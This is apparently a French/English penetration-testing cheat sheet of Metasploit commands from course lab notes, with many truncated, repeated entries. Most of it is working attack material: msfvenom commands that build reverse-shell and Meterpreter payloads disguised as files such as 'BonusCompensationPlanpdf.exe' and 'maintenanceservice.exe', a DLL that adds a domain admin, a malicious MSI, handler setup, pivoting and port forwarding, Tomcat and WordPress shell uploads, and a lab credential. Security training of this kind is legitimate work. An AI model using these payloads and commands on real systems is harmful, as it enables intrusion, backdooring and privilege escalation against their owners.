# Metasploit

% metasploit, msf, cpts

## Metasploit - Metasploit - Metasploit - Metasploit - public-exploit
#cat/ATTACK/EXPLOIT #cpts
Voir Exploit DB, Rapid7 DB, Vulnerability Lab

```
searchsploit $technos
```

## Metasploit - Metasploit - Metasploit - Metasploit - msf
#cat/ATTACK/EXPLOIT #cpts
Listing payloads

```
msfvenom -l payloads
```

## Metasploit - Metasploit - Metasploit - Metasploit - stageless-for-linux
#cat/ATTACK/EXPLOIT #cpts
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

## Metasploit - Metasploit - Metasploit - Metasploit - msfconsole
#cat/ATTACK/EXPLOIT #cpts
Not everything is on msfconsole : [Rapid7 repo](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits) Search

```
search $name
```

## Metasploit - Metasploit - Metasploit - Metasploit - stageless-for-windows
#cat/ATTACK/EXPLOIT #cpts
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

## Metasploit - Metasploit - Metasploit - Metasploit - metasploit
#cat/ATTACK/EXPLOIT #cpts
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

## Metasploit - Metasploit - Metasploit - Metasploit - configuring-msfs-socks-proxy
#cat/ATTACK/EXPLOIT #cpts
En gros on upload un reverse shell sur le serveur pivot et on se connecte au listener meterpreter de notre machine, une fois avec une session meterpreter sur notre serveur pivot, on prépare le proxy socks et on lance aut

```
msf6 > use auxiliary/server/socks_proxy
```

## Metasploit - Metasploit - Metasploit - Metasploit - is-it-running
#cat/ATTACK/EXPLOIT #cpts
```
msf6 auxiliary(server/socks_proxy) > jobs
```

## Metasploit - Metasploit - Metasploit - Metasploit - add-to-etcproxychainsconf
#cat/ATTACK/EXPLOIT #cpts
```
socks4 127.0.0.1 9050
```

## Metasploit - Metasploit - Metasploit - Metasploit - creating-routes-with-autoroute
#cat/ATTACK/EXPLOIT #cpts
```
msf6 > use post/multi/manage/autoroute
```

## Metasploit - Metasploit - Metasploit - Metasploit - or-via-meterpreter
#cat/ATTACK/EXPLOIT #cpts
```
meterpreter > run autoroute -s 172.16.5.0/23
```

## Metasploit - Metasploit - Metasploit - Metasploit - or-via-meterpreter-2
#cat/ATTACK/EXPLOIT #cpts
After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected. Listing Active Routes with AutoRoute

```
meterpreter > run autoroute -p
```

## Metasploit - Metasploit - Metasploit - Metasploit - port-forwarding
#cat/ATTACK/EXPLOIT #cpts
Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter sessio

```
meterpreter > help portfwd
```

## Metasploit - Metasploit - Metasploit - Metasploit - creating-local-tcp-relay
#cat/ATTACK/EXPLOIT #cpts
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

## Metasploit - Metasploit - Metasploit - Metasploit - connecting-to-windows-target-through-localhost
#cat/ATTACK/EXPLOIT #cpts
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## Metasploit - Metasploit - Metasploit - Metasploit - netstat-output
#cat/ATTACK/EXPLOIT #cpts
```
netstat -antp
```

## Metasploit - Metasploit - Metasploit - Metasploit - reverse-port-forwarding-rules
#cat/ATTACK/EXPLOIT #cpts
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

## Metasploit - Metasploit - Metasploit - Metasploit - configuring-starting-multihandler
#cat/ATTACK/EXPLOIT #cpts
```
meterpreter > bg
```

## Metasploit - Metasploit - Metasploit - Metasploit - generating-the-windows-payload
#cat/ATTACK/EXPLOIT #cpts
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

## Metasploit - Metasploit - Metasploit - Metasploit - establishing-the-meterpreter-session
#cat/ATTACK/EXPLOIT #cpts
```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Metasploit - Metasploit - Metasploit - Metasploit - creating-the-windows-payload
#cat/ATTACK/EXPLOIT #cpts
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

## Metasploit - Metasploit - Metasploit - Metasploit - starting-msf-console-configuring-starting-the-multihandler
#cat/ATTACK/EXPLOIT #cpts
```
use exploit/multi/handler
```

## Metasploit - Metasploit - Metasploit - Metasploit - binding-shell
#cat/ATTACK/EXPLOIT #cpts
![2e7646e10360ac16161a4f5ec713ecd1.png](:/0ce6be6c6e454305878e4278ce843afc)

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

## Metasploit - Metasploit - Metasploit - Metasploit - generating-a-dll-payload
#cat/ATTACK/EXPLOIT #cpts
```
[!bash!]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

## Metasploit - Metasploit - Metasploit - Metasploit - configuring-starting-msf-multihandler
#cat/ATTACK/EXPLOIT #cpts
```
PAYLOAD => windows/x64/meterpreter/reverse_tcp
```

## Metasploit - Metasploit - Metasploit - Metasploit - using-metasploit-with-proxychains
#cat/ATTACK/EXPLOIT #cpts
We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established. Dynamic Port Forwarding with SSH and SOCKS Tunneling

```
set LHOST eth0
```

## Metasploit - Metasploit - Metasploit - Metasploit - creating-a-windows-payload-with-msfvenom
#cat/ATTACK/EXPLOIT #cpts
Remote/Reverse Port Forwarding with SSH

```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= -f exe -o backupscript.exe LPORT=8080
```

## Metasploit - Metasploit - Metasploit - Metasploit - configuring-starting-the-multihandler
#cat/ATTACK/EXPLOIT #cpts
Remote/Reverse Port Forwarding with SSH

```
msf6 > use exploit/multi/handler
```

## Metasploit - Metasploit - Metasploit - Metasploit - creating-payload-for-ubuntu-pivot-host
#cat/ATTACK/EXPLOIT #cpts
Meterpreter Tunneling & Port Forwarding

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

## Metasploit - Metasploit - Metasploit - Metasploit - starting-msf-console
#cat/ATTACK/EXPLOIT #cpts
Socat Redirection with a Reverse Shell

```
sudo msfconsole
```

## Metasploit - Metasploit - Metasploit - Metasploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433
#cat/ATTACK/EXPLOIT #cpts
Students need to elevate their functionalities by getting a reverse shell, using `msfconsole` and the `web_delivery` exploit:

```
sudo msfconsole -q
```

## Metasploit - Metasploit - Metasploit - Metasploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ sudo msfconsole -q
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/ATTACK/EXPLOIT #cpts
Students first need to prepare a `meterpreter` web_delivery payload from the ParrotOS jump-box:

```
set payload windows/x64/meterpreter/reverse_tcp
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/ATTACK/EXPLOIT #cpts
Students first need to prepare a `meterpreter` web_delivery payload from the ParrotOS jump-box:

```
set TARGET 2
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/ATTACK/EXPLOIT #cpts
Students first need to prepare a `meterpreter` web_delivery payload from the ParrotOS jump-box:

```
set SRVHOST 172.16.7.240
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-4
#cat/ATTACK/EXPLOIT #cpts
Students first need to prepare a `meterpreter` web_delivery payload from the ParrotOS jump-box:

```
set LHOST 172.16.7.240
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-5
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ $sudo msfconsole -q
```

## Metasploit - Metasploit - Metasploit - Metasploit - code-execution
#cat/ATTACK/EXPLOIT #cpts
The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically. The module uploads a malicious

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

## Metasploit - Metasploit - Metasploit - Metasploit - code-execution-2
#cat/ATTACK/EXPLOIT #cpts
We can then issue the `show options` command to ensure that everything is set up properly. In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error `Exploit aborted

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
```

## Metasploit - Metasploit - Metasploit - Metasploit - tomcat-manager---war-file-upload
#cat/ATTACK/EXPLOIT #cpts
To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, whi

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

## Metasploit - Metasploit - Metasploit - Metasploit - searchsploit
#cat/ATTACK/EXPLOIT #cpts
```
searchsploit adobe coldfusion
```

## Metasploit - Metasploit - Metasploit - Metasploit - directory-traversal
#cat/ATTACK/EXPLOIT #cpts
In this example, the `../` sequences have been used to replace a valid `locale` to traverse the directory structure and access the `passwd` file located in the `/etc/` directory. Using `searchsploit`, copy the exploit to

```
searchsploit -p 14641
```

## Metasploit - Metasploit - Metasploit - Metasploit - directory-traversal-2
#cat/ATTACK/EXPLOIT #cpts
In this example, the `../` sequences have been used to replace a valid `locale` to traverse the directory structure and access the `passwd` file located in the `/etc/` directory. Using `searchsploit`, copy the exploit to

```
File Type: Python script, ASCII text executable
```

## Metasploit - Metasploit - Metasploit - Metasploit - searchsploit-3
#cat/ATTACK/EXPLOIT #cpts
```
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

## Metasploit - Metasploit - Metasploit - Metasploit - perform-a-login-bruteforcing-attacking-against-tomcat-manager-at-web01
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP web01.inlanefreight.local` Students then need to start `msfconsole`, use the `auxiliary/

```
msfconsole -q
```

## Metasploit - Metasploit - Metasploit - Metasploit - perform-a-login-bruteforcing-attacking-against-tomcat-manager-at-web01-2
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP web01.inlanefreight.local` Students then need to start `msfconsole`, use the `auxiliary/

```
set RHOSTS STMIP
```

## Metasploit - Metasploit - Metasploit - Metasploit - perform-a-login-bruteforcing-attacking-against-tomcat-manager-at-web01-3
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP web01.inlanefreight.local` Students then need to start `msfconsole`, use the `auxiliary/

```
set RPORT 8180
```

## Metasploit - Metasploit - Metasploit - Metasploit - perform-a-login-bruteforcing-attacking-against-tomcat-manager-at-web01-4
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP web01.inlanefreight.local` Students then need to start `msfconsole`, use the `auxiliary/

```
set VHOST web01.inlanefreight.local
```

## Metasploit - Metasploit - Metasploit - Metasploit - perform-a-login-bruteforcing-attacking-against-tomcat-manager-at-web01-5
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP web01.inlanefreight.local` Students then need to start `msfconsole`, use the `auxiliary/

```
set STOP_ON_SUCCESS true
```

## Metasploit - Metasploit - Metasploit - Metasploit - perform-a-login-bruteforcing-attacking-against-tomcat-manager-at-web01-6
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ msfconsole -q
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtain-remote-code-execution-on-the-web01inlanefreightlocal8180-tomcat
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP web01.inlanefreight.local` Students then need to generate a `JSP` reverse-shell payload

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o backup.war
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtain-remote-code-execution-on-the-web01inlanefreightlocal8180-tomcat-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f war -o backup.war
```

## Metasploit - Metasploit - Metasploit - Metasploit - find-another-valid-user-on-the-target-gitlab-instance
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to make sure that the following vHost entry is present in `/etc/hosts`: - `STMIP gitlab.inlanefreight.local` Then, using `searchsploit`, students need to download the [Git

```
searchsploit -m ruby/webapps/49821.sh
```

## Metasploit - Metasploit - Metasploit - Metasploit - find-another-valid-user-on-the-target-gitlab-instance-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ searchsploit -m ruby/webapps/49821.sh
```

## Metasploit - Metasploit - Metasploit - Metasploit - find-another-valid-user-on-the-target-gitlab-instance-3
#cat/ATTACK/EXPLOIT #cpts
```
File Type: ASCII text
```

## Metasploit - Metasploit - Metasploit - Metasploit - gain-remote-code-execution-on-the-gitlab-instance-submit-the-flag-in-t
#cat/ATTACK/EXPLOIT #cpts
Building on the previous question and the `GitLab` user created in the previous section, students first need to download the [Gitlab 13.10.2 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49

```
searchsploit -m ruby/webapps/49951.py
```

## Metasploit - Metasploit - Metasploit - Metasploit - gain-remote-code-execution-on-the-gitlab-instance-submit-the-flag-in-t-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ searchsploit -m ruby/webapps/49951.py
```

## Metasploit - Metasploit - Metasploit - Metasploit - what-user-is-coldfusion-running-as
#cat/ATTACK/EXPLOIT #cpts
After spawning the target machine, students need to use `searchsploit` to mirror the `50057.py` exploit file:

```
searchsploit -m 50057.py
```

## Metasploit - Metasploit - Metasploit - Metasploit - what-user-is-coldfusion-running-as-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ searchsploit -m 50057.py
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t
#cat/ATTACK/EXPLOIT #cpts
First, students need to navigate to `http://monitoring.inlanefreight.local` and sign in with the previously attained credentials `nagiosadmin:oilaKglm7M09@CPL&^lC`: At the left-most bottom corner, students will find that

```
searchsploit nagios 5.7
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t-2
#cat/ATTACK/EXPLOIT #cpts
```
shell-session
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t-3
#cat/ATTACK/EXPLOIT #cpts
Students need to mirror/copy the exploit script:

```
searchsploit -m php/webapps/49422.py
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t-4
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ searchsploit -m php/webapps/49422.py
```

## Metasploit - Metasploit - Metasploit - Metasploit - connect-to-the-target-system-and-escalate-privileges-using-the-screen-
#cat/ATTACK/EXPLOIT #cpts
Then, students need to use `searchsploit` on `Pwnbox`/`PMVPN` to search for the exploit code `GNU Screen 4.5.0`:

```
searchsploit "GNU Screen 4.5.0"
```

## Metasploit - Metasploit - Metasploit - Metasploit - connect-to-the-target-system-and-escalate-privileges-using-the-screen--2
#cat/ATTACK/EXPLOIT #cpts
Subsequently, students need to mirror/copy the exploit code `linux/local/41154.sh` locally:

```
searchsploit -m "linux/local/41154.sh"
```

## Metasploit - Metasploit - Metasploit - Metasploit - connect-to-the-target-system-and-escalate-privileges-using-the-screen--3
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ searchsploit -m linux/local/41154.sh
```

## Metasploit - Metasploit - Metasploit - Metasploit - connect-to-the-target-system-and-escalate-privileges-using-the-screen--4
#cat/ATTACK/EXPLOIT #cpts
```
File Type: Bourne-Again shell script, ASCII text executable
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-flag4txt
#cat/ATTACK/EXPLOIT #cpts
Then, students need to use `msfvenom`, specifying the payload `java/jsp_shell_reverse_tcp`, `LPORT` to be the port that `nc` is listening on (i.e., `PWNPO`):

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
```

## Metasploit - Metasploit - Metasploit - Metasploit - submit-the-contents-of-flag4txt-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.228 LPORT=9001 -f war -o managerUpdated.war
```

## Metasploit - Metasploit - Metasploit - Metasploit - generating-malicious-dll
#cat/ATTACK/EXPLOIT #cpts
We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.

```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

## Metasploit - Metasploit - Metasploit - Metasploit - generating-malicious-srrstrdll-dll
#cat/ATTACK/EXPLOIT #cpts
First, let's generate a DLL to execute a reverse shell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

## Metasploit - Metasploit - Metasploit - Metasploit - generating-malicious-binary
#cat/ATTACK/EXPLOIT #cpts
Let's generate a malicious `maintenanceservice.exe` binary that can be used to obtain a Meterpreter reverse shell connection from our target.

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

## Metasploit - Metasploit - Metasploit - Metasploit - metasploit-resource-script
#cat/ATTACK/EXPLOIT #cpts
Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.

```
set PAYLOAD windows/x64/meterpreter/reverse_https
```

## Metasploit - Metasploit - Metasploit - Metasploit - metasploit-resource-script-2
#cat/ATTACK/EXPLOIT #cpts
Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.

```
set LHOST <lhost>
```

## Metasploit - Metasploit - Metasploit - Metasploit - metasploit-resource-script-3
#cat/ATTACK/EXPLOIT #cpts
Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.

```
set LPORT 8443
```

## Metasploit - Metasploit - Metasploit - Metasploit - launching-metasploit-with-resource-script
#cat/ATTACK/EXPLOIT #cpts
Launch Metasploit using the Resource Script file to preload our settings.

```
sudo msfconsole -r handler.rc
```

## Metasploit - Metasploit - Metasploit - Metasploit - generating-msi-package
#cat/ATTACK/EXPLOIT #cpts
We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

## Metasploit - Metasploit - Metasploit - Metasploit - obtaining-a-meterpreter-shell
#cat/ATTACK/EXPLOIT #cpts
From the output, we can see several missing patches. From here, let's get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs. First, we need to obtain a `Meterpreter

```
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

## Metasploit - Metasploit - Metasploit - Metasploit - searching-for-local-privilege-escalation-exploit
#cat/ATTACK/EXPLOIT #cpts
From here, let's search for the [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.

```
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
```

## Metasploit - Metasploit - Metasploit - Metasploit - setting-privilege-escalation-module-options
#cat/ATTACK/EXPLOIT #cpts
Once this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session, setting our tun0 IP for the LHOST, and a call-back port of our choosing.

```
CMD no Command to execute instead of a payload
```

## Metasploit - Metasploit - Metasploit - Metasploit - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your
#cat/ATTACK/EXPLOIT #cpts
To set up pivoting using `Metasploit`, students first need to generate a reverse shell in the ELF file format:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=PWNIP LPORT=443 -f elf > shell.elf
```

## Metasploit - Metasploit - Metasploit - Metasploit - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.171 LPORT=443 -f elf > shell.elf
```

## Metasploit - Metasploit - Metasploit - Metasploit - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-3
#cat/ATTACK/EXPLOIT #cpts
Subsequently, students need to setup `Metasploit's` `multi/handler` module on `Pwnbox`/`PMVPN`:

```
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

## Metasploit - Metasploit - Metasploit - Metasploit - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-4
#cat/ATTACK/EXPLOIT #cpts
Subsequently, students need to setup `Metasploit's` `multi/handler` module on `Pwnbox`/`PMVPN`:

```
set LHOST PWNIP
```

## Metasploit - Metasploit - Metasploit - Metasploit - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-5
#cat/ATTACK/EXPLOIT #cpts
Subsequently, students need to setup `Metasploit's` `multi/handler` module on `Pwnbox`/`PMVPN`:

```
set LPORT 443
```

## Metasploit - Metasploit - Metasploit - Metasploit - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt-
#cat/ATTACK/EXPLOIT #cpts
From `Pwnbox`/`PMVPN`, students need to create a Windows-based `meterpreter` payload that will call back to the internal `NIC` on `DMZ01` but be executed from the target DC (it's important that `LPORT` has the same value

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=PWNPO
```

## Metasploit - Metasploit - Metasploit - Metasploit - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--2
#cat/ATTACK/EXPLOIT #cpts
```
└──╼ [★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234
```

## Metasploit - Metasploit - Metasploit - Metasploit - redelegate
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: redelegate

```
use auxiliary/admin/mssql/mssql_enum_domain_accounts msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts)
```

## Metasploit - Metasploit - Metasploit - Metasploit - napper
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: napper

```
rev.exe
```

## Metasploit - Metasploit - Metasploit - Metasploit - napper-2
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: napper

```
use multi/handler msf6 exploit(multi/handler)
```

## Metasploit - Metasploit - Metasploit - Metasploit - napper-3
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: napper

```
set payload windows/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler)
```

## Metasploit - Metasploit - Metasploit - Metasploit - napper-4
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: napper

```
set LHOST tun0 msf6 exploit(multi/handler)
```

## Metasploit - Metasploit - Metasploit - Metasploit - napper-5
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: napper

```
set LPORT 1337 msf6 exploit(multi/handler)
```

## Metasploit - Metasploit - Metasploit - Metasploit - napper-6
#cat/ATTACK/EXPLOIT #cpts
extrait du PDF Joplin: napper

```
bg msf6 exploit(multi/handler)
```

